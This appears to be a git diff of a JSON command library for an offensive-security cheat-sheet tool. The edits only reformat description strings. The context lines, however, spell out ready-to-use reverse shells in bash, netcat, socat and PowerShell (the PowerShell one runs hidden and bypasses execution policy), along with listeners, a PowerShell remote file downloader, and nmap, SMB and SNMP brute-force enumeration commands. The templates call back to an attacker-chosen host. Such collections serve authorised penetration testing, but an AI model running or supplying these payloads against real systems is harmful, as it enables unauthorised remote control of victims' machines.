@@ -9,14 +9,14 @@
                 "qname": "RSB1",
                 "ctext": "bash -c ‘bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>1’",
                 "parms": ["LHOST","LPORT"],
-                "des": "Can be used to create a reverse shell from a Remote System to a Local system. \nParams:\n\tLHOST: Local System IP \n\tLPORT: Local Port system is listening on."
+                "des": "Can be used to create a reverse shell from a Remote System to a Local system. \nParams:\n\nLHOST: Local System IP \nLPORT: Local Port system is listening on."
 			},
             {
 				"lname": "Reverse Shell Bash2",
 				"qname": "RSB2",
 				"ctext": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
 				"parms": ["LHOST", "LPORT"],
-                "des": "Can be used to create a reverse shell from a Remote System to a Local system. \nParams:\n\tLHOST: Local System IP \n\tLPORT: Listening Port",
+                "des": "Can be used to create a reverse shell from a Remote System to a Local system. \nParams:\n\nLHOST: Local System IP \nLPORT: Listening Port",
                 "color": "#FDFD96"
 			},
             {
@@ -24,14 +24,14 @@
 				"qname": "RSScat",
 				"ctext": "socat TCP:{LHOST}:{LPORT} EXEC:\"bash -li\",pty,stderr,sigint,setsid,sane",
 				"parms": ["LHOST","LPORT"],
-                "des": "Can be used to create a reverse shell from a Remote System to a Local system. \nParams:\n\tLHOST: Local System IP \n\tLPORT: Listening Port"
+                "des": "Can be used to create a reverse shell from a Remote System to a Local system. \nParams:\n\nLHOST: Local System IP \nLPORT: Listening Port"
 			},
             {
 				"lname": "Listener Socat",
 				"qname": "LstScat",
 				"ctext": "socat TCP-L:{LPORT} FILE:`tty`,raw,echo=0",
 				"parms": ["LPORT"],
-                "des": "Creates a Listener on Local system for a Reverse Shell to connect to. \nParams:\n\tLPORT: Listening Port"
+                "des": "Creates a Listener on Local system for a Reverse Shell to connect to. \nParams:\n\nLPORT: Listening Port"
 			},
 			{
 				"lname": "Socat Encryption File",
@@ -46,7 +46,7 @@
 				"qname": "RSScatEnc",
 				"ctext": "socat OPENSSL:{LHOST}:{LPORT},verify=0 EXEC:/bin/bash",
 				"parms": ["LHOST","LPORT"],
-                "des": "Creates an ecrypted Reverse Shell with Listener Socat Encrypted. \nParams:\n\tLHOST: Local System IP\n\tLPORT: Listening Port",
+                "des": "Creates an ecrypted Reverse Shell with Listener Socat Encrypted. \nParams:\n\nLHOST: Local System IP\nLPORT: Listening Port",
                 "color": "#B5CCFE"
 			},
             {
@@ -54,7 +54,7 @@
 				"qname": "LstScatEnc",
 				"ctext": "socat OPENSSL-LISTEN:{LPORT},cert={Filename},verify=0 -",
 				"parms": ["LPORT", "Filename"],
-                "des": "Creates Encrypted Listener. Inorder to use you'll need to make an encryption file for the listener with Socat Encryption File.\nParams:\n\tLPORT: Listening Port\n\tFilename: Encryption Filename",
+                "des": "Creates Encrypted Listener. Inorder to use you'll need to make an encryption file for the listener with Socat Encryption File. \nParams:\n\nLPORT: Listening Port\nFilename: Encryption Filename",
                 "color": "#B5CCFE"
 			},
             {
@@ -62,7 +62,7 @@
 				"qname": "RSPwr",
 				"ctext": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{LHOST}\",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
 				"parms": ["LHOST", "LPORT"],
-                "des": "Reverse Shell with Powershell. Can use a netcat or Socat Listener to catch. \nParams:\n\tLHOST: Local System IP\n\tLPORT: Listening Port"
+                "des": "Reverse Shell with Powershell. Can use a netcat or Socat Listener to catch. \nParams:\n\nLHOST: Local System IP\nLPORT: Listening Port"
 			},
 			{
                 "lname": "Webshell PHP",
@@ -89,7 +89,7 @@
 				"qname": "PSDwn",
 				"ctext": "powershell.exe (New-Object System.Net.WebClient).DownloadFile('{URL}/{Filename}','{Filename}')\n",
 				"parms": ["URL", "Filename"],
-                "des": "Uses powershell to download file from remote server. \nParams:\n\tURL: Address of download server. Ex: https://10.1.1.1:8000\n\tFilename: Filename of file to be downloaded"
+                "des": "Uses powershell to download file from remote server. \nParams:\n\nURL: Address of download server. Ex: https://10.1.1.1:8000\nFilename: Filename of file to be downloaded"
             }
 		]
 	},
@@ -101,14 +101,14 @@
 				"qname": "NMAPNet",
 				"ctext": "nmap -sn {RHOST} -oA {File}",
 				"parms": ["RHOST", "File"],
-                "des": "Scans host on network with ping scan. Not fully conclusive since host may not respond to pings \nParams:\n\tRHOST: Remote System IP (Should use network ID for best results) \n\tFile: General filename of output file. (no extension)"
+                "des": "Scans host on network with ping scan. Not fully conclusive since host may not respond to pings \nParams:\n\nRHOST: Remote System IP (Should use network ID for best results) \nFile: General filename of output file. (no extension)"
             },
             {
                 "lname": "Nmap Detailed scan",
 				"qname": "NMAPDet",
 				"ctext": "nmap -p- -sT -sC -sV -O -T4 {RHOST} -oA {File}",
 				"parms": ["RHOST", "File"],
-                "des": "Scans all ports with TCP Scan, Script scan, Version scan, and OS scan. \nParams:\n\tRHOST: Remote System IP \n\tFile: General filename of output file. (no extension)",
+                "des": "Scans all ports with TCP Scan, Script scan, Version scan, and OS scan. \nParams:\n\nRHOST: Remote System IP \nFile: General filename of output file. (no extension)",
                 "color": "#FF6961"
             },
 			{
@@ -116,7 +116,7 @@
 				"qname": "NMAPSMB",
 				"ctext": "nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse {RHOST} -oA {File}",
 				"parms": ["RHOST", "File"],
-                "des": "Nmap scan that uses common smb enum scripts. \nParams:\n\tRHOST: Remote System IP \n\tFile: General filename of output file. (no extension)",
+                "des": "Nmap scan that uses common smb enum scripts. \nParams:\n\nRHOST: Remote System IP \nFile: General filename of output file. (no extension)",
                 "color": "#FDFD96"
             },
 			{
@@ -124,7 +124,7 @@
 				"qname": "SMBls",
 				"ctext": "smbclient -L \\\\\\\\{RHOST}",
 				"parms": ["RHOST"],
-                "des": "List Available Shares\nParams:\n\tRHOST: Remote System IP",
+                "des": "List Available Shares. \nParams:\n\nRHOST: Remote System IP",
                 "color": "#FDFD96"
             },
 			{
@@ -132,7 +132,7 @@
 				"qname": "SNMPenum",
 				"ctext": "onesixtyone -c {CommunityStr} {RHOST}",
 				"parms": ["CommunityStr", "RHOST"],
-                "des": "Can Enumerate SNMP by brute forcing community strings. Can be downloaded from here https://github.com/trailofbits/onesixtyone/blob/master/dict.txt \nParams:\n\tCommunityStr: List of community strings to brute force.\n\tRHOST: Remote Host IP"
+                "des": "Can Enumerate SNMP by brute forcing community strings. Can be downloaded from here https://github.com/trailofbits/onesixtyone/blob/master/dict.txt \nParams:\n\nCommunityStr: List of community strings to brute force.\nRHOST: Remote Host IP"
             }
 		]
 	}
